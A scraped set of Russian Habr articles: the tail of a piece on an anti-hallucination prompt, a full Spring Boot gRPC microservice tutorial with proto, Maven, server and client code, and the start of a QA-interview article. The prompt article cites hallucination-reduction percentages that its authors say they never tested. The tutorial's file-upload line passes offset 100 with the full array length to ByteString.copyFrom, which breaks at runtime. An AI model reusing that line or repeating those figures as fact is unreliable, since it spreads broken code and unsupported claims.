  Обратите внимание, поскольку вопрос задавался последовательно, модель при ответе на второй запрос использовала галлюцинации из первого ответа (вымышленного автора), но, тем не менее, исходила из позиции честности.
Еще один пример работы промпта с ИИ Грок вы можете посмотреть по ссылке.
❯ Прогноз по эффективности
По нашим наблюдениям (включая диалоги, внутренние тесты и оценки от других моделей):
Снижение галлюцинаций: от 50% до 80% в зависимости от тематики.
Особенно эффективно в научных, юридических, технических запросах. Меньше работает в открытом творческом режиме, что является допустимым компромиссом.
Этот промпт был создан как костыль в текущем проекте в нерабочее время, и, с нашей точки зрения, он со своей задачей справился. Но, скажем прямо, создавать специально тестовый набор по 200 вопросов в категориях:
— Фактологические вопросы с однозначными ответами;
— Вопросы с неполной информацией в обучающих данных;
— Вопросы о несуществующих объектах, замаскированные под обычные;
— Запросы с скрытым требованием сочинить информацию.
А затем проводить исследование на чистых моделях и моделях с данным промптом мы, к сожалению, не имеем возможности. В любом случае, текст промпта в открытом доступе, желающие могут провести тестирование и усовершенствовать предложенный подход. Протокол достоверности — это не закрытый проект, а открытый инструмент, который может эволюционировать с развитием моделей и накоплением опыта их использования.
Особую ценность этот подход представляет для сфер с высокой ценой ошибки: медицинских консультаций, юридической аналитики, финансового моделирования, инженерных расчетов и образования. Интеграция принципов «Протокола достоверности» в пользовательские интерфейсы корпоративных ИИ-систем может стать стандартом ответственного применения искусственного интеллекта.
В перспективе мы видим развитие концепции в сторону адаптивных промптов, учитывающих доменную специфику и уровень критичности запроса. «Протокол достоверности v3.0» будет включать динамически настраиваемые пороги уверенности и механизмы объяснения степени достоверности каждого фрагмента ответа.
❯ Заключение
Традиционная модель общения с ИИ неявно поощряет антропоморфизацию и ложное ощущение всезнания системы. Пользователь спрашивает — машина отвечает, причем почти всегда уверенно и развернуто. Эта парадигма опасна: она создает иллюзию разговора с экспертом, когда на самом деле происходит взаимодействие со статистической моделью.
«Протокол достоверности» меняет эту динамику, делая пользователя активным участником процесса верификации, а не пассивным потребителем информации. Он устанавливает новый социальный контракт: модель честно признает свои ограничения, а пользователь принимает эти ограничения как неотъемлемую часть технологии, а не как сбой.
Особенно важен этот подход для поколения, выросшего с ИИ-ассистентами. Формирование критического отношения к генеративным системам, понимание их принципиальных ограничений и привычка проверять полученную информацию, эти навыки должны быть базовыми элементами цифровой грамотности в эпоху искусственного интеллекта.
Мы не предлагаем идеальное решение. Но «Протокол Достоверности» — это простое и мощное средство, которое можно внедрить уже сейчас: в пользовательские сценарии, в корпоративные интерфейсы, в задачи, где точность важнее творческой выразительности.
Это не просто защита от ошибок. Это новая этика взаимодействия с ИИ.
P.S. Внешняя рецензия ИИ Грок, встроенного в X (твиттер)
Перевод на русский язык:
Синхронизированный подход Протокола Достоверности v2.1 может снизить количество галлюцинаций на 40–45%, что превосходит 20–36% от изолированных техник, благодаря многоуровневым мерам защиты — таким как остановка при высокой энтропии и самокритичный пересмотр. Оставшиеся галлюцинации, скорее всего, связаны с ограниченностью обучающих данных, неоднозначностью запросов или архитектурными ограничениями модели.
Добавление семантических фильтров может увеличить снижение выше 50%, хотя это пока предположение без эмпирических данных.
Способность сказать «я не знаю» — это достоинство, так как она ставит точность выше догадок, особенно в критически важных областях.
Обновлённая оценка эффективности v2.1 — примерно 40–45%, что отражает его интегральную структуру.
 Автор текста: Гадеев Камиль
Новости, обзоры продуктов и конкурсы от команды Timeweb.Cloud — в нашем Telegram-канале ↩
Опробовать ↩
📚 Читайте также:
➤ Нейро-дайджест: ключевые события мира AI за 5 – 12 мая 2025
➤ Запускаем раритетные платы фискальной памяти
➤ ИИ для веб-разработки
➤ Как я обучал LoRA на стиле South Park для Flux: сбор кадров через MPV, особенности FluxGym и эксперименты с рангами
➤ Wizordum — пример правильной ностальгии"
gRPC — новый Rest. Секреты интеграции в Spring Boot,https://habr.com/ru/articles/910092/,"В мире микросервисов зачастую возникает нужда в быстром общении между сервисами, как альтернатива Rest API к нам на помощь приходит gRPC. Статья будет посвящена реализации gRPC с помощью Spring Boot и...","В мире микросервисов зачастую возникает нужда в быстром общении между сервисами, как альтернатива Rest API к нам на помощь приходит gRPC. Статья будет посвящена реализации gRPC с помощью Spring Boot и Java 17, и будет полезна тем, кто начинает своё знакомство с gRPC.
Немного теории
Схема общения микросервисов
Что такое gRPC?
gRPC (Google Remote Procedure Calls) - это современная и высокопроизводительная система вызова удалённой процедуры (RPC) с открытом исходным кодом, разработанная IT-гигантом Google. Данное решение позволяет эффективно передавать данные между сервисами, используя протокол HTTP/2, а для определения процедуры используется Protocol Buffers. Технология поддерживается многими языками, такими как: Java, C++, Python и другие. Более подробно можете узнать в официальной документации gRPC.
Преимущества
Высокая производительность – Благодаря использованию HTTP/2 и protobuf, gRPC обеспечивает минимальные задержки и высокую пропускную способность.
Строгая типизация – Применение protobuf для описания сервисов и сообщений позволяет строго задавать структуру данных, что уменьшает вероятность ошибок на этапе компиляции.
Мультиплатформенность – Поддержка множества языков программирования позволяет объединять компоненты, написанные на разных технологиях, в единую систему, упрощая интеграцию и переиспользование кода.
Двунаправленный стриминг – gRPC поддерживает не только запрос-ответ, но и двусторонние потоки, а также полный дуплекс, что делает его отличным выбором для работы с данными в реальном времени, например, в чатах или системах мониторинга.
Автоматическая генерация кода – gRPC автоматически создает клиентские и серверные заглушки (stubs), избавляя разработчиков от написания шаблонного кода и снижая вероятность ошибок. Это ускоряет процесс разработки.
Недостатки
Высокий порог входа – Для новичков gRPC может показаться сложным из-за необходимости изучения protobuf и особенностей работы с HTTP/2. Однако с опытом освоение технологии становится проще.
Ограниченная поддержка в браузерах – Большинство браузеров не поддерживают gRPC напрямую, что требует использования дополнительных решений, таких как gRPC-Web или прокси-серверы, что усложняет разработку веб-приложений.
Зависимость от Protocol Buffers – Применение protobuf в качестве основного формата сериализации может быть неудобным для тех, кто привык к JSON или XML. Хотя protobuf более эффективен, он требует дополнительных шагов для преобразования данных.
Требования к инфраструктуре – Эффективное использование gRPC возможно только при поддержке HTTP/2 на уровне сетевой инфраструктуры, что может потребовать дополнительных настроек и ресурсов, особенно если существующая система не адаптирована под HTTP/2.
Работа с Protocol Buffers
ProtoBuf — это язык описания интерфейса и система сериализации данных, разработанные Google. Они используются для сериализации структурированных данных. Структура данных в ProtoBuf описывается в файлах с расширением .proto. Эти файлы содержат определения сообщений (аналогично классам в ООП) и сервисов (опционально). Более подробно можно почитать здесь.
Вот, пример структуры сообщения:
message Area {
    string id = 1;
    string title = 2;
    string description = 3;
    string address = 4;
    google.protobuf.Timestamp creationDateTime = 5;
    google.protobuf.Timestamp updateDateTime = 6;
    Coordinate Coordinate = 7;
}
Объявление сервиса:
service AreaService {
    rpc GetAreas (google.protobuf.Empty) returns (AreaList) {};
    rpc GetAreaById (AreaId) returns (Area) {};
    rpc CreateArea (AreaToCreate) returns (AreaId) {};
    rpc SaveFile (File) returns (google.protobuf.Empty) {};
    rpc StreamingFile (stream File) returns (google.protobuf.Empty) {};
}
Основные типы данных ProtoBuf
int32 (для int) — значение по умолчанию: 0
int64 (для long) — значение по умолчанию: 0
float — значение по умолчанию: 0
double — значение по умолчанию: 0
bool — значение по умолчанию: false
string — значение по умолчанию: пустая строка
byte (для byte[])
repeated (для List/Collection)
map (для Map) — значение по умолчанию: empty map
enum — значение по умолчанию: первое значение в списке значений.
Есть также классы-обёртки, например, как ""google/protobuf/timestamp.proto"" для даты и времени.
Перейдём к реализации
В рамках статьи разработаем один модуль и два микросервиса. Рекомендуется реализовать проекты с gRPC с разными модулями:
gRPC-interface: Содержит файлы формата .proto и генерирует Java классы.
gRPC-server: Содержит реализацию gRPC ""эндпоинтов"" и gRPC-interface в качестве зависимости через Maven локальный репозиторий.
gRPC-client: Любой клиент на Java, который обращается к нашим gRPC ""эндпоинтам"".
Разделение проекта на модули при разработке с gRPC помогает сделать код более модульным, переиспользуемым и удобным для сопровождения.
Технологии разработки будут:
Spring Boot
Spring Cloud
gRPC
Rest API
Swagger
OAuth 2.0
MapStruct
Spring Data Jpa/Hibernate
PostgreSQL
Наш проект будет иметь микросервисную архитектуру.
Eureka Server
API Gateway
grpc-interface
area-client
area-server
В статье будут рассматриваться grpc-interface, area-client, area-server.
grpc-interface
Для начала опеределим area.proto файл и опишим процедуры.
syntax = ""proto3"";

import ""google/protobuf/timestamp.proto"";
import ""google/protobuf/empty.proto"";

package ru.acgnn.grpc.area;

option java_multiple_files = true;
option java_package = ""ru.acgnn.grpc"";
option java_outer_classname = ""AreaServerGrpcProto"";

service AreaService {
    rpc GetAreas (google.protobuf.Empty) returns (AreaList) {};
    rpc GetAreaById (AreaId) returns (Area) {};
    rpc CreateArea (AreaToCreate) returns (AreaId) {};
    rpc SaveFile (File) returns (google.protobuf.Empty) {};
    rpc StreamingFile (stream File) returns (google.protobuf.Empty) {};
}

message AreaId {
    string id = 1;
}

message AreaList {
    repeated Area areas = 1;
}

message Coordinate {
    double longitude = 1;
    double latitude = 2;
}

message Area {
    string id = 1;
    string title = 2;
    string description = 3;
    string address = 4;
    google.protobuf.Timestamp creationDateTime = 5;
    google.protobuf.Timestamp updateDateTime = 6;
    Coordinate Coordinate = 7;
}

message AreaToCreate {
    string title = 1;
    string description = 2;
    string address = 3;
    Coordinate Coordinate = 4;
}

message File {
    string content_type = 1;
    bytes content = 2;
}
Блок message отвечает за определение структуры сообщения в rpc эндпоинтах, блок service - за эндпоинты, что они возвращают и принимают на вход.
Напишем pom.xml, чтобы проект правильно собрался и скомпилировался.
Добавляем следующие зависимости:
<dependency>
    <groupId>io.grpc</groupId>
    <artifactId>grpc-stub</artifactId>
    <version>${grpc.version}</version>
</dependency>

<dependency>
    <groupId>io.grpc</groupId>
    <artifactId>grpc-protobuf</artifactId>
    <version>${grpc.version}</version>
</dependency>

<dependency>
    <!-- Java 9+ compatibility - Do NOT update to 2.0.0 -->
    <groupId>jakarta.annotation</groupId>
    <artifactId>jakarta.annotation-api</artifactId>
    <version>1.3.5</version>
    <optional>true</optional>
</dependency>
Блок build будет выглядить следующим образом:
<build>
    <extensions>
        <extension>
            <groupId>kr.motd.maven</groupId>
            <artifactId>os-maven-plugin</artifactId>
            <version>1.7.0</version>
        </extension>
    </extensions>

    <plugins>
        <plugin>
            <groupId>org.xolstice.maven.plugins</groupId>
            <artifactId>protobuf-maven-plugin</artifactId>
            <version>${protobuf-plugin.version}</version>
            <configuration>
                <protocArtifact>com.google.protobuf:protoc:${protobuf.version}:exe:${os.detected.classifier}</protocArtifact>
                <pluginId>grpc-java</pluginId>
                <pluginArtifact>io.grpc:protoc-gen-grpc-java:${grpc.version}:exe:${os.detected.classifier}</pluginArtifact>
                <protoSourceRoot>${basedir}/src/main/proto/</protoSourceRoot>
            </configuration>
            <executions>
                <execution>
                    <goals>
                        <goal>compile</goal>
                        <goal>compile-custom</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
Обратите внимание на артефакты, они будут нужны, чтобы добавлять интерфейс в другие проекты, как зависимость. В статье будем рассматривать сборщик Maven.
<groupId>ru.acgnn.grpc</groupId>
<artifactId>grpc-interface</artifactId>
<version>1.0.0</version>
Структура проекта выглядет так:
Структура проекта
Запустив сборку проекта, появятся скомпилированные Java классы.
Скомпилированные Java классы
area-server
В этом микросервисе напишем небольшую бизнес-логику для grpc эндпоинтов.
Для начала добавим следующие зависимости:
<dependency>
 <groupId>org.springframework.boot</groupId>
 <artifactId>spring-boot-starter-data-jpa</artifactId>
</dependency>

<dependency>
 <groupId>ru.acgnn.grpc</groupId>
 <artifactId>grpc-interface</artifactId>
 <version>1.0.0</version>
</dependency>

<dependency>
 <groupId>org.springframework.boot</groupId>
 <artifactId>spring-boot-starter-oauth2-resource-server</artifactId>
</dependency>

<dependency>
 <groupId>org.springframework.boot</groupId>
 <artifactId>spring-boot-starter-validation</artifactId>
</dependency>

<dependency>
 <groupId>org.postgresql</groupId>
 <artifactId>postgresql</artifactId>
 <scope>runtime</scope>
</dependency>

<dependency>
 <groupId>org.projectlombok</groupId>
 <artifactId>lombok</artifactId>
 <optional>true</optional>
</dependency>

<dependency>
 <groupId>org.hibernate</groupId>
 <artifactId>hibernate-spatial</artifactId>
 <version>${hibernate.version}</version>
</dependency>

<dependency>
 <groupId>org.springframework.boot</groupId>
 <artifactId>spring-boot-starter-test</artifactId>
 <scope>test</scope>
</dependency>

<dependency>
 <groupId>org.mapstruct</groupId>
 <artifactId>mapstruct</artifactId>
 <version>${mapstruct.version}</version>
</dependency>

<dependency>
 <groupId>org.springframework.cloud</groupId>
 <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>
</dependency>

<dependency>
 <groupId>org.mapstruct</groupId>
 <artifactId>mapstruct-processor</artifactId>
 <version>${mapstruct.version}</version>
</dependency>
Дальше приступим к реализации бизнес-логики. В пакете grpc объявим следующий класс:
import java.util.UUID;

import org.springframework.security.access.prepost.PreAuthorize;

import com.google.protobuf.Empty;

import io.grpc.stub.StreamObserver;
import lombok.RequiredArgsConstructor;
import net.devh.boot.grpc.server.service.GrpcService;
import ru.acgnn.area_server.mapper.AreaMapper;
import ru.acgnn.area_server.service.AreaService;
import ru.acgnn.area_server.service.FileService;
import ru.acgnn.grpc.Area;
import ru.acgnn.grpc.AreaId;
import ru.acgnn.grpc.AreaList;
import ru.acgnn.grpc.AreaServiceGrpc.AreaServiceImplBase;
import ru.acgnn.grpc.AreaToCreate;
import ru.acgnn.grpc.File;

@GrpcService
@RequiredArgsConstructor
@PreAuthorize(""hasRole('admin')"")
public class AreaGrpc extends AreaServiceImplBase {

    private final AreaService areaService;
    private final FileService fileService;
    private final AreaMapper areaMapper;

    @Override
    public void getAreaById(AreaId request, StreamObserver<Area> responseObserver) {
        responseObserver.onNext(areaMapper.toDto(areaService.getById(UUID.fromString(request.getId()))));
        responseObserver.onCompleted();
    }

    @Override
    public void getAreas(Empty request, StreamObserver<AreaList> responseObserver) {
        responseObserver.onNext(AreaList.newBuilder().addAllAreas(areaMapper.toListDto(areaService.getAll())).build());
        responseObserver.onCompleted();
    }

    @Override
    public void createArea(AreaToCreate request, StreamObserver<AreaId> responseObserver) {
        responseObserver.onNext(
            AreaId.newBuilder()
                .setId(areaService.createArea(areaMapper.toEntity(request)).getId().toString())
                .build()
        );
        responseObserver.onCompleted();
    }
    
    @Override
    public void saveFile(File file, StreamObserver<Empty> responseObserver) {
        fileService.saveFile(file);
        responseObserver.onNext(Empty.newBuilder().build());
        responseObserver.onCompleted();
    }
}
Здесь расширяемся классом AreaServiceImplBase, который был сгенерирован модулем grpc-interface, и из него делаем импорт нужных нам классов. В проекте соблюдается цепочка: repository -> service -> mapper -> controller. То есть на уровне сервиса мы работаем с сущностями и все методы возвращают сущность, а в ответ grpc ручки с помощью маппера конвертируем сущность в нужный dto-класс.
Сервис у нас будет максимально простым.
import java.util.List;
import java.util.UUID;

import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import ru.acgnn.area_server.exception.ApiServiceException;
import ru.acgnn.area_server.model.entity.AreaEntity;
import ru.acgnn.area_server.repository.AreaRepository;

@Slf4j
@Service
@RequiredArgsConstructor
public class AreaService {

    private final AreaRepository areaRepo;

    public AreaEntity getById(UUID id) {
        return areaRepo.findById(id)
            .orElseThrow(() -> new ApiServiceException(""Площадка не найдена"", HttpStatus.NOT_FOUND));
    }

    @Transactional
    public AreaEntity createArea(AreaEntity area) {
        if (areaRepo.existsByTitleOrCoordinateOrAddress(area.getTitle(), area.getCoordinate(), area.getAddress())) {
            throw new ApiServiceException(""Такая площадка уже существует"", HttpStatus.CONFLICT);
        }
        return areaRepo.save(area);
    }

    public List<AreaEntity> getAll() {
        return areaRepo.findAll();
    }
}
Теперь обратим внимание на Mapper:
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.List;

import org.locationtech.jts.geom.GeometryFactory;
import org.locationtech.jts.geom.Point;
import org.locationtech.jts.geom.PrecisionModel;
import org.mapstruct.Mapper;
import org.mapstruct.Mapping;
import org.mapstruct.MappingConstants;
import org.mapstruct.Named;
import org.mapstruct.NullValuePropertyMappingStrategy;

import com.google.protobuf.Timestamp;

import ru.acgnn.grpc.Area;
import ru.acgnn.grpc.AreaToCreate;
import ru.acgnn.grpc.Coordinate;
import ru.acgnn.area_server.model.entity.AreaEntity;

@Mapper(
    componentModel = MappingConstants.ComponentModel.SPRING,
    nullValuePropertyMappingStrategy = NullValuePropertyMappingStrategy.IGNORE
)
public interface AreaMapper {

    @Mapping(source = ""area.creationDateTime"", target = ""creationDateTime"", qualifiedByName = ""toTimestamp"")
    @Mapping(source = ""area.updateDateTime"", target = ""updateDateTime"", qualifiedByName = ""toTimestamp"")
    @Mapping(source = ""area.coordinate"", target = ""coordinate"", qualifiedByName = ""toCoordinate"")
    Area toDto(AreaEntity area);

    @Mapping(source = ""area.coordinate"", target = ""coordinate"", qualifiedByName = ""toPoint"")
    AreaEntity toEntity(AreaToCreate area);

    List<Area> toListDto(List<AreaEntity> areas);

    @Named(""toTimestamp"")
    default Timestamp toTimestamp(LocalDateTime dateTime) {
        return Timestamp.newBuilder()
            .setSeconds(dateTime.atZone(ZoneId.of(""Europe/Moscow"")).toEpochSecond())
            .build();
    }

    @Named(""toCoordinate"")
    default Coordinate toCoordinate(Point coordinate) {
        return Coordinate.newBuilder()
            .setLatitude(coordinate.getY())
            .setLongitude(coordinate.getX())
            .build();
    }

    @Named(""toLocalDateTime"")
    default LocalDateTime toLocalDateTime(Timestamp timestamp) {
        return Instant
            .ofEpochSecond(timestamp.getSeconds())
            .atZone(ZoneId.of(""Europe/Moscow""))
            .toLocalDateTime();
    }

    @Named(""toPoint"")
    default Point toPoint(Coordinate coordinate) {
        GeometryFactory geometryFactory = new GeometryFactory(new PrecisionModel(), 4326);
        return geometryFactory.createPoint(new org.locationtech.jts.geom.Coordinate(coordinate.getLongitude(), coordinate.getLatitude()));
    }
}
Здесь благодаря зависимости mapstruct можно реализовывать маппинг объектов на уровне interface-класса, который поднимается как Сomponent на уровне приложения.
import org.springframework.http.HttpStatus;

import lombok.Getter;

@Getter
public class ApiServiceException extends RuntimeException {

    private final HttpStatus status;

    public ApiServiceException(String message, HttpStatus status) {
        super(message);
        this.status = status;
    }
}
Мой кастомный класс ошибки. Теперь возникает вопрос, как настроить Controller Advice так, чтобы он возвращал ошибки с корректными статусами.
import org.springframework.http.HttpStatus;
import org.springframework.security.oauth2.server.resource.InvalidBearerTokenException;

import io.grpc.Status;
import lombok.extern.slf4j.Slf4j;
import net.devh.boot.grpc.server.advice.GrpcAdvice;
import net.devh.boot.grpc.server.advice.GrpcExceptionHandler;
import ru.acgnn.area_server.exception.ApiServiceException;

@Slf4j
@GrpcAdvice
public class GprcHandler {

    @GrpcExceptionHandler(ApiServiceException.class)
    public Status handleInvalidArgument(ApiServiceException e) {
        log.debug(""ApiServiceException: {}"", e.getMessage());
        return getStatus(e.getStatus()).withDescription(e.getMessage());
    }

    @GrpcExceptionHandler(InvalidBearerTokenException.class)
    public Status handleInvalidBearerTokenException(InvalidBearerTokenException e) {
        log.debug(""InvalidBearerTokenException: {}"", e.getMessage());
        return Status.UNAUTHENTICATED.withDescription(e.getMessage());
    }

    @GrpcExceptionHandler(IllegalArgumentException.class)
    public Status handleIllegalArgumentException(IllegalArgumentException e) {
        log.debug(""IllegalArgumentException: {}"", e.getMessage());
        return Status.INVALID_ARGUMENT.withDescription(e.getMessage());
    }

    private Status getStatus(HttpStatus status) {
        return switch (status) {
            case NOT_FOUND -> Status.NOT_FOUND;
            case BAD_REQUEST -> Status.INVALID_ARGUMENT;
            case CONFLICT -> Status.ALREADY_EXISTS;
            case FORBIDDEN -> Status.PERMISSION_DENIED;
            case UNAUTHORIZED -> Status.UNAUTHENTICATED;
            case SERVICE_UNAVAILABLE -> Status.UNAVAILABLE;
            default -> Status.INTERNAL;
        };
    }
}
Пришла идея реализовать маппинг HttpStatus с GrpsStatus с помощь switch-case. Не очень креативно, но эффективно! Этот хендлер работает только для gRPC эндпоинтов, для HTTP ручек он работать не будет, будет лучше создать отдельный handler-класс, аннотируемый @RestControllerAdvice.
import java.time.LocalDateTime;
import java.util.Objects;
import java.util.UUID;

import org.hibernate.annotations.Comment;
import org.hibernate.annotations.CreationTimestamp;
import org.hibernate.annotations.UpdateTimestamp;
import org.hibernate.proxy.HibernateProxy;
import org.locationtech.jts.geom.Point;

import jakarta.persistence.Column;
import jakarta.persistence.Entity;
import jakarta.persistence.GeneratedValue;
import jakarta.persistence.GenerationType;
import jakarta.persistence.Id;
import jakarta.persistence.Table;
import jakarta.persistence.UniqueConstraint;
import jakarta.validation.constraints.NotNull;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Getter;
import lombok.NoArgsConstructor;
import lombok.Setter;

@Entity
@Getter
@Setter
@Builder
@Table(
    name = ""area"", 
    uniqueConstraints = {
        @UniqueConstraint(name = ""unique_area"", columnNames = { ""title"", ""address"", ""coordinate"" })
    }
)
@NoArgsConstructor
@AllArgsConstructor
public class AreaEntity {

    @Id
    @Column(name = ""id"")
    @Comment(""ID записи"")
    @GeneratedValue(strategy = GenerationType.UUID)
    private UUID id;

    @CreationTimestamp
    @Column(name = ""creation_date_time"", nullable = false, updatable = false)
    @Comment(""Дата и время создания записи"")
    private LocalDateTime creationDateTime;

    @UpdateTimestamp
    @Column(name = ""update_date_time"", nullable = false)
    @Comment(""Дата и время обновления записи"")
    private LocalDateTime updateDateTime;

    @NotNull
    @Comment(""Название площадки"")
    @Column(name = ""title"")
    private String title;

    @NotNull
    @Comment(""Описание площадки"")
    @Column(name = ""description"", columnDefinition = ""text"")
    private String description;

    @NotNull
    @Comment(""Адресс площадки"")
    @Column(name = ""address"")
    private String address;

    @NotNull
    @Column(name = ""coordinate"")
    @Comment(""Координаты площадки"")
    private Point coordinate;

    @Override 
    public final boolean equals(Object o) { 
        if (this == o) return true;
        if (o == null) return false;
        Class<?> oEffectiveClass = o instanceof HibernateProxy ? ((HibernateProxy) o).getHibernateLazyInitializer().getPersistentClass() : o.getClass(); 
        Class<?> thisEffectiveClass = this instanceof HibernateProxy ? ((HibernateProxy) this).getHibernateLazyInitializer().getPersistentClass() : this.getClass(); 
        if (thisEffectiveClass != oEffectiveClass) return false; 
        AreaEntity area = (AreaEntity) o; 
        return getId() != null && Objects.equals(getId(), area.getId()); 
    } 
    
    @Override 
    public final int hashCode() { 
        return this instanceof HibernateProxy ? ((HibernateProxy) this).getHibernateLazyInitializer().getPersistentClass().hashCode() : getClass().hashCode(); 
    }
}
Сущность выглядит следующим образом. На данный момент, особого внимания ей уделяться не будет.
В application.properties укажите следующие настройки:
# Service properties
spring.application.name=area-server
server.port=0
server.servlet.context-path=/

# Discovery client properties
eureka.client.service-url.default-zone=http://localhost:8761/eureka

# gRPC-server properties
grpc.server.port=0
Это будет необходимо, чтобы мы могли обращаться к микросервису по его названию, а не по адресу и порту.
Так выглядит структура микросервиса:
Структура area-server
Теперь мы увидели как на grpc-server'е реализуется бизнес-логика приложения.
area-client
В этом микросервисе рассмотрим как обращаться к gRPC-эндпоинтам нашего сервиса.
Добавляем зависимости:
<dependency>
 <groupId>org.springdoc</groupId>
 <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>
 <version>${springdoc.version}</version>
</dependency>

<dependency>
 <groupId>org.springframework.boot</groupId>
 <artifactId>spring-boot-starter-web</artifactId>
</dependency>

<dependency>
 <groupId>org.springframework.cloud</groupId>
 <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>
</dependency>

<dependency>
 <groupId>org.springframework.boot</groupId>
 <artifactId>spring-boot-starter-oauth2-resource-server</artifactId>
</dependency>

<dependency>
 <groupId>org.projectlombok</groupId>
 <artifactId>lombok</artifactId>
 <optional>true</optional>
</dependency>

<!-- Наш gRPC-interface -->
<dependency>
 <groupId>ru.acgnn.grpc</groupId>
 <artifactId>grpc-interface</artifactId>
 <version>1.0.0</version>
</dependency>

<dependency>
 <groupId>org.mapstruct</groupId>
 <artifactId>mapstruct</artifactId>
 <version>${mapstruct.version}</version>
</dependency>

<dependency>
 <groupId>org.springframework.boot</groupId>
 <artifactId>spring-boot-starter-test</artifactId>
 <scope>test</scope>
</dependency>
В application.properties укажем следующие параметры:
# Discovery client properties
eureka.client.service-url.default-zone=http://localhost:8761/eureka

grpc.client.area.address=discovery:///area-server
grpc.client.area.negotiation-type=plaintext
grpc.client.area.enable-keep-alive=true
grpc.client.area.address - в этом параметре мы указываем, что к клиенту под названием ""area"" будем обращаться по названию микросервиса через discovery-server (Eureka Server).
Структура сервиса будет выглядить следующим образом:
Структура area-client
Рассмотрим, как обращаться к grpc-server'у:
import java.io.IOException;
import java.util.UUID;

import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.oauth2.server.resource.authentication.JwtAuthenticationToken;
import org.springframework.stereotype.Service;
import org.springframework.web.multipart.MultipartFile;

import com.google.protobuf.ByteString;
import com.google.protobuf.Empty;

import io.grpc.CallCredentials;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import net.devh.boot.grpc.client.inject.GrpcClient;
import net.devh.boot.grpc.client.security.CallCredentialsHelper;
import ru.acgnn.area_client.mapper.ApiMapper;
import ru.acgnn.grpc.Area;
import ru.acgnn.grpc.AreaId;
import ru.acgnn.grpc.AreaList;
import ru.acgnn.grpc.AreaServiceGrpc.AreaServiceBlockingStub;
import ru.acgnn.grpc.AreaToCreate;
import ru.acgnn.grpc.File;

@Slf4j
@Service
@RequiredArgsConstructor
public class ApiService {

    @GrpcClient(""area"")
    private AreaServiceBlockingStub grpcClient;
    private final ApiMapper apiMapper;

    public Area getById(UUID id) {
        return grpcClient
            .withCallCredentials(bearerAuth())
            .getAreaById(AreaId.newBuilder().setId(id.toString()).build());
    }

    public AreaList getAll() {
        return grpcClient
            .withCallCredentials(bearerAuth())
            .getAreas(Empty.getDefaultInstance());
    }
    
    public UUID create(AreaToCreate area, MultipartFile file) {
        try {
            grpcClient
                .withCallCredentials(bearerAuth())
                .saveFile(
                    File.newBuilder()
                        .setContent(ByteString.copyFrom(file.getBytes(), 100, file.getBytes().length))
                        .setContentType(file.getContentType())
                        .build()
                );
        } catch (IOException e) {
            log.debug(""IOException: {}"", e.getMessage());
        }
        return UUID.fromString(grpcClient
            .withCallCredentials(bearerAuth())
            .createArea(area)
            .getId()
        );
    }

    private CallCredentials bearerAuth() {
        JwtAuthenticationToken token = (JwtAuthenticationToken) SecurityContextHolder.getContext().getAuthentication();
        return CallCredentialsHelper.bearerAuth(() -> token.getToken().getTokenValue());
    }
}
Таким образом, при помощи @GrpcClient мы можем легко интегрироваться с gRPC-сервером, используя аннотацию и указав имя сервиса, зарегистрированного в Eureka Server. Это позволяет нам абстрагироваться от конкретных настроек и сконцентрироваться на бизнес-логике.
Метод withCallCredentials() добавляет токен в каждый запрос. В данном примере токен извлекается из SecurityContextHolder, который содержит JwtAuthenticationToken. Это позволяет нам реализовать защищённый доступ к методам gRPC, используя OAuth 2.0 JWT.
При создании новой сущности через метод create() мы отправляем как данные для создания (AreaToCreate), так и файл (MultipartFile). Файл преобразуется в ByteString и отправляется с указанием MIME-типа, что может быть полезно при обработке файлов на сервере.
Такой подход позволяет гибко взаимодействовать с gRPC-сервисами, не заботясь о низкоуровневой реализации протокола.
Итог
Таким образом, мы разобрали как реализовать микросервисную архитектуру на Java с помощью Spring Boot, Spring Cloud и т.д., где основным средством коммуникации является gRPC. В текущей статье, я старался максимально выжать основное, без воды, делая упор на интеграции gRPC в наши Spring Boot приложения. Если статья будет интересной сообществу, в следующей части, я бы хотел показать, как интегрировать OAuth2.0 в наш gRPC-сервер.
P.S. Это моя первая статья, не судите строго. Очень буду рад обратной связи и помочь Вам в комментариях, если появятся вопросы."
Что происходит с собеседованиями QA в 2025 году? Взгляд с обеих сторон баррикад,https://habr.com/ru/companies/kts/articles/910066/,"Привет! Я Рома Авдонин, Head of QA в KTS.
На Хабре уже выходили посты о том, как тяжело найти работу QA в 2024–2025 годах, но мало кто взвешивает сразу две позиции — и кандидата, и нанимателя. Я побыв...","Привет! Я Рома Авдонин, Head of QA в KTS.
На Хабре уже выходили посты о том, как тяжело найти работу QA в 2024–2025 годах, но мало кто взвешивает сразу две позиции — и кандидата, и нанимателя. Я побывал по обе стороны и решил поделиться наблюдениями.
Пару слов обо мне: за последние полгода я провел больше сотни собеседований, а ранее сам активно проходил их как соискатель. Совсем недавно я полностью перестроил процесс найма тестировщиков в нашей компании (если будет интересно, пишите в комментах, расскажу об этом отдельно) и теперь хочу поговорить о том, что изменилось на рынке QA, почему собеседования стали такими сложными, как к ним адаптируются компании и что с этим делать соискателям и нанимателям, чтобы не свихнуться.
Оглавление
Почему собеседования сегодня — это не то, что было раньше?
HR не отвечает не потому что плохой, а потому что захлебывается
Тестовые задания: работа или проверка?
Многоэтапные собеседования — это защита, а не издевка
Читерство, микронаушники и использование нейронок
Таро, гороскопы и прочая псевдонаука
А камеру включать обязательно?
Чек-лист для соискателя: как не вылететь с первой минуты
Чек-лист для нанимателя: найм — это тоже диалог
Почему собеседования сегодня — это не то, что было раньше?
Сфера обеспечения качества меняется довольно стремительно. Если в 2015 году для успешного прохождения собеседования было достаточно вызубрить виды тестирования и техники тест-дизайна, а в 2020 — владеть парой инструментов автоматизации и иметь хороший словарный запас профессиональной лексики, то сегодня требования сильно изменились:
Кандидатов стало в десятки раз больше, конкуренция усилилась, поэтому наниматели усложняют отбор.
Качество подготовки к самим собеседованиям выросло: кандидаты обучены проходить собесы, появились коучи и менторы для прохождения собеседований.
